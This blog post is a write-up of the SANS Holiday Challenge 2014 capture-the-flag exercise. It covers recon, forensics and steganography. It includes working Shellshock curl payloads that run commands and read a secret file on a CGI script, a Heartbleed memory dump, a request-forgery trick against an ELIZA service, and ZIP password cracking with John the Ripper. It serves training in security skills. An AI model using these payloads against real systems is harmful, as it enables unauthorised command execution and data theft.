---
layout: post
title: "SANS Holiday Challenge 2014 - Writeup"
date: 2015-01-05 07:15
comments: true
published: true
categories:
---
<img src="{{root_url}}/images/headers/sans_holiday_2014.png"/>
### Introduction
Back in December, SANS [released](pen-testing.sans.org/holiday-challenge/2014) another installment of their annual holiday challenge. I enjoyed [taking on the 2012 challenge](http://raidersec.blogspot.com/search/label/SANS), so I was excited to see what SANS had in store this year. This year's challenge didn't disappoint with a nice mix of basic network recon, web application hacking, and some forensics. This post will detail how I found each required "secret" to solve the challenge.

*I'd like to extend a personal thanks for all the hard work SANS puts in to putting on this challenge every year.*
<!--more-->
### Ghost of Hacking Past

Let's start with a basic nmap:

```
root@jordan:~# nmap -v -A -n -Pn -p 1-65535 173.255.233.59
<snip>
Discovered open port 22/tcp on 173.255.233.59
Discovered open port 31124/tcp on 173.255.233.59
</snip>
```

The SSH service is locked down and doesn't prove fruitful since the only supported authentication method is via public/private keys. However, if we connect to the service on TCP port 31124 using netcat, we find an implementation of the well-known [ELIZA program](http://en.wikipedia.org/wiki/ELIZA):

```
root@jordan:~# nc 173.255.233.59 31124
I AM ELIZA.  WHAT'S ON YOUR MIND?
```

With some trial and error, I found that if we ask for the secret multiple times, we get a hint:

```
root@jordan:~# nc 173.255.233.59 31124
I AM ELIZA.  WHAT'S ON YOUR MIND?
> secret
A GIRL'S GOTTA KEEP HER SECRETS.  WHY DON'T YOU ASK ME ABOUT SOMETHING ELSE?
> secret
YOU REALLY ARE INTERESTED IN MY SECRET.  I THINK WE SHOULD GET TO KNOW EACH OTHER BETTER FIRST.  TELL ME ABOUT YOUR FAVOURITE WEBSITES.
> secret
I AM SO SORRY, BUT I CAN'T TELL YOU MY SECRET VIA THIS DIALOG.  I DO REALLY LIKE YOU, BUT I WORRY THAT SOMEONE MAY BE SHOULDER SURFING YOU.  NO ONE IS SHOULDER SURFING ME, THOUGH, SO WHY DON'T YOU GIVE ME A URL THAT I CAN SURF TO?
```

Looks like we can make Eliza navigate to a URL of our choosing. Let's setup a netcat listener, and then point Eliza to it to see what she does.

Back on our server, we setup the listener:
```
root@jordan:~# nc -l -p 80
```

Then, we tell Eliza to visit the host

```
> surf to http://x.x.x.x
DOES THIS LOOK LIKE THE CORRECT PAGE?
```

And, back in our netcat session, we see this:

```
GET / HTTP/1.1
Accept-Encoding: identity
Host: 107.170.44.35
Connection: close
User-Agent: Mozilla/5.0 (Bombe; Rotors:36) Eliza Secret: "Machines take me by surprise with great frequency. -Alan Turing"
```

Awesome - one down. Let's move on.

### Ghost of Hacking Present

SANS is great at incorporating big vulnerabilities found in the previous year into their holiday challenges. As such, I was hoping there would be a mention to Heartbleed and Shellshock somewhere in their challenges. Sure enough, the Ghost of Hacking Present allowed us to leverage both vulnerabilities to our advantage.

Let's start with the HTTPS service.

Running a [Heartbleed POC script](link), we can see the following dumped from the server:

```
0180: 01 00 0F 00 01 01 43 25 32 30 69 74 73 25 32 30  ......C%20its%20
0190: 66 6F 72 6D 25 32 43 25 32 30 61 6E 64 25 32 30  form%2C%20and%20
01a0: 6C 65 66 74 25 32 30 6E 6F 74 68 69 6E 67 25 32  left%20nothing%2
01b0: 30 6F 66 25 32 30 69 74 25 32 30 76 69 73 69 62  0of%20it%20visib
01c0: 6C 65 25 32 30 73 61 76 65 25 32 30 6F 6E 65 25  le%20save%20one%
01d0: 32 30 6F 75 74 73 74 72 65 74 63 68 65 64 25 32  20outstretched%2
01e0: 30 68 61 6E 64 2E 25 32 30 42 75 74 25 32 30 66  0hand.%20But%20f
01f0: 6F 72 25 32 30 74 68 69 73 25 32 30 69 74 25 32  or%20this%20it%2
0200: 30 77 6F 75 6C 64 25 32 30 68 61 76 65 25 32 30  0would%20have%20
0210: 62 65 65 6E 25 32 30 64 69 66 66 69 63 75 6C 74  been%20difficult
0220: 25 32 30 74 6F 25 32 30 64 65 74 61 63 68 25 32  %20to%20detach%2
0230: 30 69 74 73 25 32 30 66 69 67 75 72 65 25 32 30  0its%20figure%20
0240: 66 72 6F 6D 25 32 30 74 68 65 25 32 30 6E 69 67  from%20the%20nig
0250: 68 74 25 32 43 25 32 30 61 6E 64 25 32 30 73 65  ht%2C%20and%20se
0260: 70 61 72 61 74 65 25 32 30 69 74 25 32 30 66 72  parate%20it%20fr
0270: 6F 6D 25 32 30 74 68 65 25 32 30 64 61 72 6B 6E  om%20the%20darkn
0280: 65 73 73 25 32 30 62 79 25 32 30 77 68 69 63 68  ess%20by%20which
0290: 25 32 30 69 74 25 32 30 77 61 73 25 32 30 73 75  %20it%20was%20su
02a0: 72 72 6F 75 6E 64 65 64 2E 25 32 30 26 57 65 62  rrounded.%20&Web
02b0: 73 69 74 65 25 32 30 53 65 63 72 65 74 25 32 30  site%20Secret%20
02c0: 25 32 33 31 3D 48 61 63 6B 69 6E 67 25 32 30 63  %231=Hacking%20c
02d0: 61 6E 25 32 30 62 65 25 32 30 6E 6F 62 6C 65 25  an%20be%20noble%
```

Decoded, this gives us:

```
its form, and left nothing of it visible save one outstretched hand. But for this it would have been difficult to detach its figure from the night, and separate it from the darkness by which it was surrounded.
&Website Secret #1=Hacking can be noble
```

Now let's turn our attention to the main HTTP site. Basic recon shows us that a contact page is available at ```/cgi-bin/submit.sh```. The ```.sh``` tells us that this is likely a shell script processing the request. This immediately tells us to check for Shellshock. After a little bit of trial and error, we can get the following:

```
root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A "() { :;};echo;pwd;"
/var/www/cgi-bin
Content-Type: text/html
<html><head><style type="text/css"> body { background-color: #E9DD09; } </style><META http-equiv="refresh" content="0;URL=http://www.scrooge-and-marley.com/"></head></html>
```

Great. Now that we can start running commands, let's start exploring the filesystem. We find out pretty quickly that only bash builtin commands are available to us (no ```cat```, ```ls``` etc.) - bummer. No problem, we can start by exploring the filesystem via ```echo /<directory>*```.

```
root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A "() { :;};echo; echo /*"
/bin /dev /etc /lib /lib64 /run /sbin /secret /selinux /usr /var
```
Looks like the file is at ```/secret```. We can use a bash read loop to get the contents of it.

*Note: Make sure to escape the ```$```, otherwise the local system will try to replace the variable contents *before* sending the request.

```
root@jordan:~/sans# curl http://www.scrooge-and-marley.com/cgi-bin/submit.sh -A "() { :;};echo;while read line; do echo \$line; done < /secret;"
Website Secret #2: Use your skills for good.
```

Easy as that!

*Fun fact: the ```/server-status``` page was accessible on the server, allowing us to essentially watch as requests are being made to the server. Big shout-out to everyone trying to brute force hidden files/directories :)*

### Ghost of Hacking Future

This one was tougher than the first two - largely because I'm not great at filesystem forensics. To follow along, you can download the file [here](http://pen-testing.sans.org/hhusb.dd.bin).

First, we run ```file``` to see what kind of file this is:

```
root@jordan:~# file hhusb.dd.bin
hhusb.dd.bin: x86 boot sector, code offset 0x52, OEM-ID "NTFS    ", sectors/cluster 8, reserved sectors 0, Media descriptor 0xf8, heads 255, hidden sectors 2048, dos < 4.0 BootSector (0x0)
```

Looks like a standard NTFS filesystem. Let's try to mount the image:

```
root@jordan:~# mount hhusb.dd.bin /mnt -t ntfs
root@jordan:~# ls /mnt/
hh2014-chat.pcapng  LetterFromJackToChuck.doc
```

Sweet - we have two files. Opening the .doc doesn't give us much info, but I wonder if there's more to it than meets the eye. I ran ```strings``` on the file and found this:

```
USB Secret #1: Your demise is a source of mirth.
```
Looks like a secret was hidden in the file. Huh. Turns out, this was in one of the document properties, which are viewable using Word.

Now let's go after the PCAP. Looking through the contents of the file, we can see a conversation regarding the death of Scrooge, but no secret. I began to wonder if there was a reason that this was a pcap-**ng** file instead of just a pcap. Turns out, there are additional fields supported by pcap-ng files, one of which is packet comments.

Using Wireshark, we can find any packet comments by filtering for ```pkt_comment```:

<img src="{{root_url}}/images/blog/sans_2014/pkt_comment.png"/>

Sweet! Looks like there are two comments:

* ```VVNCIFNlY3JldCAjMjogWW91ciBkZW1pc2UgaXMgYSBzb3VyY2Ugb2YgcmVsaWVmLg==```
* https://code.google.com/p/f5-steganography/

The first one is base64 encoded:

```
root@jordan:~/sans_recovered# echo VVNCIFNlY3JldCAjMjogWW91ciBkZW1pc2UgaXMgYSBzb3VyY2Ugb2YgcmVsaWVmLg== | base64 -d
USB Secret #2: Your demise is a source of relief.
```

The other hint might come in handy later. Ok, two secrets down. But where's #3 and #4? I bet there are more files to be had. Let's use The Sleuth Kit to check for previously deleted files that we can recover:

```
root@jordan:/mnt# fls ~/hhusb.dd.bin -u
r/r 4-128-4:    $AttrDef
r/r 8-128-2:    $BadClus
r/r 8-128-1:    $BadClus:$Bad
r/r 6-128-4:    $Bitmap
r/r 7-128-1:    $Boot
d/d 11-144-4:   $Extend
r/r 2-128-1:    $LogFile
r/r 0-128-1:    $MFT
r/r 1-128-1:    $MFTMirr
r/r 9-128-8:    $Secure:$SDS
r/r 9-144-6:    $Secure:$SDH
r/r 9-144-5:    $Secure:$SII
r/r 10-128-1:   $UpCase
r/r 3-128-3:    $Volume
r/r 32-128-1:   hh2014-chat.pcapng
r/r 32-128-5:   hh2014-chat.pcapng:Bed_Curtains.zip
r/r 33-128-1:   LetterFromJackToChuck.doc
-/r * 34-128-1: Tiny_Tom_Crutches_Final.jpg
d/d 256:        $OrphanFiles
```

I see a couple of things that stand out. First off, what's that "Bed_Curtains.zip" file? Also, it looks like a file called "Tiny_Tom_Crutches_Final.jpg" was previously deleted (indicated by the ```*```). Let's go ahead and extract all these files into a directory called ```/sans_recovered```

```
root@jordan:~# mkdir sans_recovered
root@jordan:~# tsk_recover -e -f ntfs ./hhusb.dd.bin ./sans_recovered/
Files Recovered: 4
root@jordan:~# cd sans_recovered/
root@jordan:~/sans_recovered# ls
$Extend  hh2014-chat.pcapng  LetterFromJackToChuck.doc  Tiny_Tom_Crutches_Final.jpg
```

Where's "Bed_Curtains.zip"? After asking around, it turns out that this syntax indicates the file is stored as an NTFS alternate data stream. We can extract the file manually using ```icat```.

```
root@jordan:~# icat hhusb.dd.bin 32-128-5 > sans_recovered/Bed_Curtains.zip
```

Let's unzip it:

```
root@jordan:~/sans_recovered# unzip Bed_Curtains.zip
Archive:  Bed_Curtains.zip
[Bed_Curtains.zip] Bed_Curtains.png password:
```

Looks like it's password protected, so what password should we use? At this point, we notice the following hint given by the SANS storyline:

> Just work with me on this, man. There's something important and even CeWL here for you.

This suggests that the tool [```CeWL```](http://digi.ninja/projects/cewl.php) would be useful in creating a custom wordlist to break the password. We can run the tool like this:

```
./cewl.rb -d 3 -w sans_wordlist.txt http://pen-testing.sans.org/holiday-challenge/2014
```

Unfortunately, after trying this as a wordlist for both the SANS URL as well as directly with hackersforcharity.org, I still couldn't find the right password. So, next choice - just use a huge wordlist. We'll crack the password using John the Ripper (ver: 1.7.9-jumbo-7).

```
root@jordan:~# zip2john sans_recovered/Bed_Curtains.zip > sans_recovered/Bed_Curtains.john
root@jordan:~# john --wordlist=wordlists/all  --rules Bed_Curtains.john
<snip>
root@jordan:~/sans_recovered# john --show Bed_Curtains.john
/root/sans_recovered/Bed_Curtains.zip:shambolic
root@jordan:~/sans_recovered# unzip Bed_Curtains.zip
Archive:  Bed_Curtains.zip
[Bed_Curtains.zip] Bed_Curtains.png password:
inflating: Bed_Curtains.png
```

Looks like it worked! Let's take a look at the properties of the extracted image using ```exiftool```.

```
root@jordan:~# exiftool Bed_Curtains.png
File Name                       : Bed_Curtains.png
Directory                       : .
File Size                       : 1401 kB
<snip>
Comment                         : USB Secret #3: Your demise is a source of gain for others.
Exif Byte Order                 : Big-endian (Motorola, MM)
<snip>
```

One more to go. Let's look at the Tiny_Tom_crutches.png file to see what we can find. With this being a CTF style challenge, let's check for the presence of steganography. The tool ```stegdetect``` is pretty good at this, so let's see what it finds:

```
root@jordan:~/sans_recovered# stegdetect Tiny_Tom_Crutches_Final.jpg
Tiny_Tom_Crutches_Final.jpg : f5(***)
```

The hint we found pointing to [this project](https://code.google.com/p/f5-steganography/) might come in handy. Let's see if we can use it to get the secret:

```
root@jordan:~/sans_recovered# java -jar f5.jar x -e secret.txt Tiny_Tom_Crutches_Final.jpg
Huffman decoding starts
Permutation starts
423168 indices shuffled
Extraction starts
Length of embedded file: 116 bytes
(1, 127, 7) code used
root@jordan:~/sans_recovered# cat secret.txt
Tiny Tom has died.

USB Secret #4: You can prevent much grief and cause much joy. Hack for good, not evil or greed.
```

There it is! All the secrets have been retrieved.

### Conclusion
As always, this was a fantastic challenge created by the folks at SANS. I enjoyed that this year's challenge contained bits and pieces from many aspects of infosec, and am already looking forward to next year's challenge!

As always, let me know if you have any questions!

-Jordan ([@jw_sec](http://twitter.com/jw_sec))
